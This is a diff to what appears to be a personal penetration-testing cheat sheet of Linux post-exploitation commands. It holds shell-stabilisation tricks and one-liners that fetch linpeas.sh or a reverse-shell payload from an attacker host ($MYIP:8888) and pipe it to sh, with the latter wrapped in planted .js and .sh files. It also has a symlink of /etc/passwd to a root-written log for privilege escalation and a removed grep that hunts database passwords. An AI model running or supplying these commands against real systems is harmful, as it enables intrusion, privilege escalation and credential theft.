@@ -1371,6 +1371,9 @@ script /dev/null -c bash
 python3 -c 'import pty; pty.spawn("/bin/bash")';
 CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256color; stty rows <num> columns <num>; reset
 
++---------- Set Custom PATH ----------+
+export PATH=/dev/shm:$PATH
+
 [*] File Transfer
 curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
@@ -1392,12 +1395,12 @@ curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 newgrp developer
 find / -group developer 2>/dev/null
 
-+---------- Find Usernames + Passwords ----------+
-(grep -IrinE '^\s*db[-_]?user\w*\s*=\s*|^\s*db[-_]?pass\w*\s*=\s*' / 2>/dev/null &)
-
 +---------- Malicious Files ----------+
 -->> .js
-echo 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_5566|sh', (err, stdout, stderr) => {});
+echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_5566|sh', (err, stdout, stderr) => {});
+
+-->> .sh
+echo -e '#!/bin/bash\ncurl $MYIP:8888/resh_5566|sh'
 
 +---------- Symlink: Writeable Root File ----------+
 ln -sf /etc/passwd /var/log/below/error_root.log
